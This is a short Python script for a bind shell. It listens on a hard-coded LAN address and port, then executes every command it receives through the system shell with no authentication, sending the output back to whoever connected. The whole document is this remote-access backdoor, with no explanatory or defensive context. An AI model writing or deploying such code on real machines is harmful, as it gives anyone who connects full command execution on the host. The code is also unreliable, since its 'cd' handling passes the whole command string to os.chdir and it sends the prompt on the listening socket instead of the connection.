import sys, socket, subprocess, time, os

def recive(connection, s):
    while(True):
        request = connection.recv(1048000)
        cmd = request.decode()
        if cmd.startswith("cd "):
            os.chdir(cmd)
            s.send(b"$ ")
            continue
        
        answer = subprocess.run(cmd, shell = True, capture_output = True)
        data = answer.stdout + answer.stderr
        connection.send(data)


def connection_to_client(address, backlog = 1):
    try:
        s = socket.socket()
        s.bind(address)
        s.listen(backlog)
        print("the server is waiting for a client connection...")
    except socket.error as error:
        print(f"something went wrong.\nmaybe there is another server opened. \nerror code: {error}")
        time.sleep(15)
        sys.exit(0)
      
    connection, client_address = s.accept()
    print(f"connection established with the client at the address: {client_address}")
    recive(connection, s)




connection_to_client(("192.168.1.1", 15000))  # you gotta change this ip if it's different
